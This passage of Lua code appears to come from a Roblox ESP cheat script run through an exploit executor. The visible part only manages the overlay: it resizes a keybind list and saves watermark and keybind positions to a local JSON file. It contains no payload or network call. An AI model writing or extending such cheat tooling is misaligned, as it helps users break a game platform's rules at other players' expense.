                pcall(function()
                    if data.uiPositions.Watermark and Library.Watermark then
                        local u = data.uiPositions.Watermark
                        Library.Watermark.Position = UDim2.new(u[1], u[2], u[3], u[4])
                    end
                    if data.uiPositions.Keybind and Library.KeybindFrame then
                        local u = data.uiPositions.Keybind
                        Library.KeybindFrame.Position = UDim2.new(u[1], u[2], u[3], u[4])
                    end
                end)
            end)
        end)

        return true
    end
end)()

;(function()
    local function refreshKeybindList()
        if not (Library and Library.KeybindContainer and Library.KeybindFrame) then return end

        local YSize, XSize = 0, 0
        for _, lbl in next, Library.KeybindContainer:GetChildren() do
            if lbl:IsA('TextLabel') then
                local visible = not (string.find(lbl.Text, '%(Always%)') or string.find(lbl.Text, 'None') or not string.find(lbl.Text, '%['))
                if lbl.Visible ~= visible then lbl.Visible = visible end
                if visible then
                    YSize = YSize + 18
                    if lbl.TextBounds.X > XSize then XSize = lbl.TextBounds.X end
                end
            end
        end
        local size = UDim2.new(0, math.max(XSize + 10, 210), 0, YSize + 23)
        if Library.KeybindFrame.Size ~= size then Library.KeybindFrame.Size = size end
    end

    for _, opt in pairs(Options) do
        if type(opt) == 'table' and opt.Type == 'KeyPicker' and type(opt.Update) == 'function' then
            local orig = opt.Update
            opt.Update = function(self, ...)
                orig(self, ...)
                refreshKeybindList()
            end
        end
    end

    EspRuntime.Connections.KeybindListRefresh = RunService.RenderStepped:Connect(function()
        pcall(refreshKeybindList)
    end)

    refreshKeybindList()
end)()

;(function()
    local UI_POS_FILE = "Valenok/ui_positions.json"
    pcall(function() if makefolder and not isfolder("Valenok") then makefolder("Valenok") end end)

    local function udimToTable(u)
        return { u.X.Scale, u.X.Offset, u.Y.Scale, u.Y.Offset }
    end
    local function tableToUDim(t)
        if type(t) ~= 'table' or #t < 4 then return nil end
        return UDim2.new(t[1], t[2], t[3], t[4])
    end

    local pending = false
    local function saveUiPositions()
        if pending then return end
        pending = true
        task.delay(0.4, function()
            pending = false
            pcall(function()
                local data = {}
                if Library.Watermark then data.Watermark = udimToTable(Library.Watermark.Position) end
                if Library.KeybindFrame then data.Keybind = udimToTable(Library.KeybindFrame.Position) end
                writefile(UI_POS_FILE, HttpService:JSONEncode(data))
            end)
        end)
    end

    pcall(function()
        if not isfile(UI_POS_FILE) then return end
        local data = HttpService:JSONDecode(readfile(UI_POS_FILE))
        if data.Watermark and Library.Watermark then
            local u = tableToUDim(data.Watermark)
            if u then Library.Watermark.Position = u end
        end
        if data.Keybind and Library.KeybindFrame then
            local u = tableToUDim(data.Keybind)
            if u then Library.KeybindFrame.Position = u end
        end
    end)

    if Library.Watermark then
        Library:GiveSignal(Library.Watermark:GetPropertyChangedSignal('Position'):Connect(saveUiPositions))
    end
    if Library.KeybindFrame then
        Library:GiveSignal(Library.KeybindFrame:GetPropertyChangedSignal('Position'):Connect(saveUiPositions))
    end
end)()
